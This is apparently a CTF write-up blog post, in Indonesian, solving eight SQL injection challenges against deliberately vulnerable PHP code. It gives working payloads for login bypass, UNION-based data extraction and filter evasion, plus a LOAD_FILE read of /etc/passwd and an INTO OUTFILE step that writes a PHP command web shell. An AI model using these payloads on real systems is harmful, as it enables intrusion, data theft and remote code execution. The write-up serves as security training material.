---
private: 'false'
modified: 2017-03-20
date: 2017-03-20
layout: post
featured: false
published: true
comments: true
title: 'SQLInjection Challenges Writeup: Level 1 - 8'
tags: [sqlinjection]
mathjax: false
imagefeature: /images/sqlinjection.jpg
description: Writeup SQLInjection Challenges
category: Web Exploitation
chart: null
---

### SQL Injection Challenges Writeup

Kita dapet soal ada 8 soal SQL injection yang cara untuk solvenya beragam, beberapa dari soal ngak bisa di selesain menggunakan automated tools seperti "SQLmap","Havij" atau kawan-kawannya di sini juga ada beberapa logic bypass yang perlu kita cari sendiri.

### Level 1

> My friend created a website where we can store secrets... Unfortunately, we can only see our own. Help me find all of my friend's secrets.

Diberikan soal dan disertakan source code nya berikut :

```php
<?php 

if (isset($_GET['source'])) {
    die(highlight_file(__FILE__));
}

require("conf/level1.conf.php"); 
error_reporting(0);

session_start();
if (isset($_POST['secret'])) { 
    $query = $conn->prepare("INSERT INTO secrets(session_id, secret) VALUES (?, ?)");
    session_regenerate_id();
    $current_session_id = session_id();
    //die($current_session_id);
    $query->bind_param('ss', $current_session_id, $_POST['secret']);
    $query->execute() or die($conn->error);
}

if (isset($_POST['session_id'])) { 
    $query = "SELECT * FROM secrets WHERE session_id = '" . $_POST['session_id'] . "'";
    $result = $conn->query($query);
} else {
    $query = "SELECT * FROM secrets WHERE session_id = '" . session_id() . "'";
    $result = $conn->query($query);
} 

?>

<!DOCTYPE HTML>
<html>
<head>
        <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    </head>
    <body>
        <div id="custom-bootstrap-menu" class="navbar navbar-default " role="navigation">
            <div class="container-fluid">
            <div class="navbar-header"><a class="navbar-brand" href="#">Secret Diary</a>
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-menubuilder"><span class="sr-only">Toggle navigation</span><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span>
                </button>
            </div>
            <div class="collapse navbar-collapse navbar-menubuilder">
                <ul class="nav navbar-nav navbar-left">
                <li><a href="#">Home</a>
                </li>
                </ul>
            </div>
            </div>
        </div>
        <div class="container-fluid">
        <?php
        if (isset($_POST['secret'])) {
            echo '<div class="alert alert-success" role="alert">Secret added successfully. You can view your secrets with the following session ID : '. session_id() .'</div>';
        }
        ?>
        <div class="row">
            <div class="col-md-2"></div>
            <div class="col-md-4">
                <form method="POST" action="level1.php">
                    <div class="input-group">
                      <input type="text" name="session_id" class="form-control" placeholder="Your session ID" aria-describedby="basic-addon2">
                      <span class="input-group-btn">
                        <button class="btn btn-default" type="submit">Get your secrets!</button>
                     </span>
                    </div>
                </form>
            </div>
            <div class="col-md-4">
                <form method="POST" action="level1.php">

                    <div class="input-group">
                      <input type="text" name="secret" class="form-control" placeholder="Your secret" aria-describedby="basic-addon2">
                      <span class="input-group-btn">
                        <button class="btn btn-default" type="submit">Add a new secret!</button>
                     </span>
                    </div>
                </form>
            </div>
            <div class="col-md-2"></div>
        </div>
    </div>

    <br/>
    <br/>
    <br/>

        <div class="container-fluid">
        <div class="row">
            <div class="col-md-4"></div>
            <div class="col-md-4">
                <div class="panel panel-default">
                  <div class="panel-heading">Your secrets</div>

                  <!-- Table -->
                  <table class="table">
                    <?php
                    if (isset($result) && $result->num_rows > 0) {
                        // output data of each row
                        while($row = $result->fetch_assoc()) {
                        echo "<tr><td>" . htmlspecialchars($row['secret']) . "</td></tr>";    
                        }
                    } else {
                        echo "<tr><td>You don't have any secrets yet.</td></tr>";
                    }
                    ?>
                  </table>
                </div>
            </div>
            <div class="col-md-4"></div>
        </div>

        </div>

    <script
              src="https://code.jquery.com/jquery-3.1.1.min.js"
              integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
              crossorigin="anonymous"></script>

        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


</body>
</html>
1
```

cara untuk menjalankan query yang benar adalah menggunakan prepared statement seperti yang di gunakana pada`$query = $conn->prepare("INSERT INTO secrets(session_id, secret) VALUES (?, ?)");`namun masih ada kesalahan pada bagian `$query = "SELECT * FROM secrets WHERE session_id = '" . $_POST['session_id'] . "'";` di sini kesalahannya dia langsung memasukan input user ke dalam query tanpa menggunakan prepared statement jadi kita bisa injeksi sql di situ

dengan simple `a' OR 1=1#` kita bisa mendapatkan flagnya

![](/images/flag-sqli-lv1.png)

### Level 2

> I think an administrator blocked my account. Can you help me steal someone else's account?
>
> **Note**: There are two flags in this challenge.

Diberikan soal yang meminta kita untuk melakukan login dan kita juga diberikan akses ke source code nya

![](/images/sqli-lv2.png)

```php
<?php 
if (isset($_GET['source'])) {
    die(highlight_file(__FILE__));
}
require("conf/level2.conf.php"); 
error_reporting(0);

if (isset($_POST['username']) && isset($_POST['password'])) {

    // $query = "SELECT flag FROM my_secret_table"; We leave commented code in production because we're cool.

    $query = "SELECT username FROM users where username = '" . $_POST['username'] . "' and password = ?";

    // We use prepared statements, it must be secure.
    $query = $conn->prepare($query); 

    // If query is invalid
    if ($query === false) {
        $error = true;
        $error_msg = "<strong>Error!</strong> Invalid SQL query";    
    } else {

    // Bind password param
    $query->bind_param("s", $_POST['password']);
    $query->execute();
    $query->bind_result($user);
    $query->fetch();

        // Check if a valid user has been found
        if ($user != NULL) {
            session_start();
            $_SESSION['is_logged_in'] = true;
            $_SESSION['username'] = $user;
        } else {
            $error = true;
            $error_msg = "<strong>Wrong!</strong> Username/Password is invalid.";
        }
    }

}
?>
<!DOCTYPE HTML>
<html>
    <head>
        <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <style>
        .corb-body { background-color: #333;}

        .centered {
          position: fixed;
          top: 50%;
          left: 50%;
          /* bring your own prefixes */
          transform: translate(-50%, -50%);
        }

        .corb-login-length { width: 500px;}
        .corb-submit { position: relative; left: auto; right: -420px;}
        .corb-flag { color: #0F0; }
        .corb-alert { margin-top: 20px; }
    </style>
    </head>
    <body class="corb-body container-fluid">
        <?php if ($_SESSION['is_logged_in'] !== true) { ?>
            <?php if (isset($error) && $error === true) { ?>
            <div class="container-fluid corb-alert">
                <div class="alert alert-danger">
                    <?php echo $error_msg; ?>
                </div>
            </div>
            <?php } ?>

        <div class="row">
            <div class="centered">
                <div class="well">
                    <h3 class="corb-login-length">Login If You Can</h3>
                    <br/>
                    <form method="POST">
                    <input name="username" class="form-control" type="text" placeholder="username">
                    <br/>
                    <input name="password" class="form-control" type="text" placeholder="password">
                    <br/>
                    <input name="submit" class="corb-submit btn btn-primary btn-lg" type="submit" value="Login">
                    </form>
                </div>
            </div>
        </div>
        <?php }else { ?>
            <div class="centered">
                <h1 class="corb-flag">Welcome <?php echo $_SESSION['username']; ?>! Here's some green text for you.</h1>        
                <h1 class="corb-flag"><?php echo $flag; ?></h1>        
            </div>
        <?php } ?>

        <script
              src="https://code.jquery.com/jquery-3.1.1.min.js"
              integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
              crossorigin="anonymous"></script>

        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


    </body>
</html>

<?php
session_destroy();
?>
1
```

Lagi-lagi di level2 ini mereka juga menggunakan prepared statement nya tidak secara keseluruhan, untuk kolom username dia langsung ambil dari user input dengan `$_POST` tapi pada kolom password dia mengunakan prepared statement. kita bisa membuat query tersebut selalu mengembalikan true dengan `' OR 1=1#`

![](/images/flag-sqli-lv2-1.png)

pada soal ini diberitahu bahwa ada 2 flag, berarti kita harus coba dig more ke source code yang diberikan dan ada clue di komentar `// $query = "SELECT flag FROM my_secret_table"; We leave commented code in production because we're cool.`

dan karena username yang di select dari database di simpan kedalam session dan ditampilkan saat login maka kita bisa menggunakan union untuk mereplace username yang sebenarnya dengan hasil dari query yang kita mau dengan menggunakan union `' union select flag from my_secret_table #` sebagai username dan di dapatkan flagnya

![](/images/flag-sqli-lv2-2.png)

### Level 3

> Time for bug bounties! This multinational technology company has been hacked so many times, we might be able find a new bug and make some money out of it...

Diberikan soal seperti search engine `Google` tapi ini namanya `Gogol`

![](/images/soal-sqli-lv3.png)

```php
<?php 
if (isset($_GET['source'])) {
    die(highlight_file(__FILE__));
}

require("conf/level3.conf.php"); 
error_reporting(0);


if (isset($_GET['q'])) {

    $filter = array('union', 'select');

    // Remove all banned characters
    foreach ($filter as $banned) {
        $_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);
    } 
}


?>
<!DOCTYPE html>
<html>
 <head>
  <title>Gogol Search</title>
 <link rel="stylesheet" href="http://www.goglogo.com/include/goglogo.css" type="text/css" />
  </head>

 <body style="margin:0;padding:0;">
 <div id="overlay_bg" style="display:none; background-color:#000000; position:fixed; z-index:1001"></div>
    <br/><br/><br/><br/>
    <div class="content-area">
        <div class="logo">
    <img src="http://funnylogo.info/logo/Google/White/Gogol.aspx">
        </div>
        <div class="searchBox">
            <table cellspacing="0" cellpadding="0" border="0">
            <tr>
                <td>
                    <form name="frm" id="frm" method="GET">
                    <input type="text" name="q" size="40" value=""/>
                    <input type="submit"/>
                    <br /><br />
                    </form>
                </td>
            </tr>
            </table>
            <br/>
        </div>

    <?php
    if (isset($_GET['q'])) {

        $query = "SELECT * FROM search_engine WHERE title LIKE '%" . $_GET['q'].  "%' OR description LIKE '%" . $_GET['q'] .  "%' OR link LIKE '%" . $_GET['q'] . "%';";
        $result = $conn->query($query);

        echo  "<h2>Number of results for '". htmlspecialchars($_GET['q']) . "' : " . $result->num_rows . "</h2>";
    ?>
    <?php
        if (isset($result) && $result->num_rows > 0) {
            echo "<hr/>";
            echo "<br/>";

            // output data of each row
            while($row = $result->fetch_assoc()) {
                echo "<div>";
                echo "<a href='" . $row['link'] . "'><h2>" . htmlspecialchars($row['title']) . "</h2></a>";
                echo "<h3>" . htmlspecialchars($row['link']) . "</h3>";
                echo "<p>" . htmlspecialchars($row['description']) . "</p>";
            }
        }
    ?>

    </div>
</div>
 </body>
</html>
<?php } ?>
1
```

Oke, kita coba analisa source code yang di dapatkan, disini input kita di treatment secara berbeda dengan level sebelumnya kali ini menggunakan parameter `$_GET` kita bisa menggunakan `union` lagi untuk me-replace hasil dari query dengan hasil query yang kita inginkan tapi permasalahannya union dan select ada di blacklist.

```php
$filter = array('union', 'select');

// Remove all banned characters
foreach ($filter as $banned) {
$_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);
}
```

semua yang match dengan union atau select akan di replace menjadi empty string "" ini sebenernya bad practice karena kita bisa melakukan bypass dengan cara `uniunionon` maka union yang di tengah akan di hapus menjadi empty string sehingga terbentuklah union yang tadinya di blacklist, kita sudah berhasil melakukan bypass terhadap filter yang ada.

maka kita bisa menggunakan `' uniunionon selselectect concat(table_name),1,1 from information_schema.tables#` untuk mendapatkan semua table yang ada dan kita menemukan table `secret`

![](/images/list-table-sqli-lv3.png)

kemudian `' uniunionon selselectect concat(column_name),1,1 from information_schema.columns where table_name='secret'#` untuk mendapatkan kolom dari table secret

![](/images/column-sqli-lv3.png)ketika kita udah tau nama kolom nya dan tabelnya tinggal dimunculin aja tuh flag gan pake ini `' uniunionon selselectect flag,1,1 from secret#`

![](/images/flag-sqli-lv3.png)

### Level 4

> Seems like our previous bug has been patched now... Let's double check that they did their job properly.

Soal yang di berikan sama seperti soal di lvl 3 tapi sekarang blacklist nya diperbaharui

```php
if (isset($_GET['q'])) {

    $filter = array('UNION', 'SELECT');

    // Remove all banned characters
    foreach ($filter as $banned) {
        if (strpos($_GET['q'], $banned) !== false) die("Hacker detected"); 
        if (strpos($_GET['q'], strtolower($banned)) !== false) die("Hacker detected"); 
    } 
}
```

Singkat cerita jadi itu yang di blacklist adalah "UNION,union,SELECT,SELECT" sehingga kita bisa menggunakan "UNiON,SElECT" dengan cara yang sama dengan level3 kita bisa mendapatkan flagnya

`3' UNiON SElECT concat(username,password),1,1 from users#`

![](/images/lvl4-sqli-flag.png)

### Level 5

> These developers are sloppy... They claim that their website is secure now \(for the second time\), I hope they are right this time...

Di level5 kali ini di filter kita tidak boleh menggunakan space.

```php
if (isset($_GET['q'])) {
    // Ban space character
    if (strpos($_GET['q'], " ") !== false) die("Hacker detected"); 
}
```

ada beberapa trik yang bisa di gunakan untuk menggantikan space di SQL contohya `/**/` kita mengunakan komentar untuk mengantikan spasi. dengan menggunakan cara yang sama dengan level sebelumnya kita bisa mendapatkan flagnya

`'/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secret#`

![](/images/sqli-lv5-flag.png)

### Level 6

> I'm starting to believe that these developers are complete idiots. They just claimed that blacklisting single-quotes and double-quotes solve every SQL injection issue.
>
> Let's prove them wrong.

Kita diberikan soal yang sama lagi dengan level sebelumnya tapi kali ini single quote dan double quote di blacklist jadi kita harus melakukan SQLinjection tanpa single quote dan double quote.

```php
if (isset($_GET['q'])) {
    // Ban space character
    if (strpos($_GET['q'], "'") !== false) die("Hacker detected"); 
    if (strpos($_GET['q'], '"') !== false) die("Hacker detected"); 
}
```

### Level 7

> My teacher has this weird website. I doubt there's any useful information in the database. Maybe we can leak the /etc/passwd file instead?

Setelah di enumurasi ternyata beberapa keyword di blacklist, seperti : **Union,Select,Load\_File,From. **Dan Spasi juga di blacklist ternyata ketika di coba kita bisa melakukan bypass pada keyword yang di filter dengan cara yang di level sebelumnya yaitu ketika match dengan suatu keyword dia akan mereplace dengan empty string maka kita bisa mengunakan payload `' UNIunionON SELselectECT concat(table_name) frfromom information_schema.tables#` namun masih error ternyata karena kita masih mengunakan spasi modifikasi payload tanpa menggunakan spasi `level7.php?id=6565656/**/UNIunionON/**/SELselectECT/**/LOAD_load_fileFILE(%27/etc/passwd%27)#`

![](/images/lvl8-sqli.png)

### Level 8

> I have no idea how I landed here, but this website is making me doubt everything I know.
>
> Is global warming real???
>
> Can Trump control the weather???
>
> Is the Earth flat???
>
> There's only one way to find out : let's pop a shell.

`4444+union+select+null,"<?php%20system($_GET[\"cmd\"]);?>"%20INTO%20OUTFILE%20"/var/www/html/uploads/lala.php"#`

disini kita bisa menggunakan into outfile untuk menulis file backdoor ke folder uploads

![](/images/rce-sqli-lv8.png)Dan kita menemukan secret folder **secret\_level8\_folder\_you\_wont\_be\_able\_to\_guess\_without\_actually\_getting\_a\_shell**

![](/images/secret-folder-sqli-lv8.png)kemudian kita mendapatkan flagnya 

![](/images/flag-sqli-lv8.png)

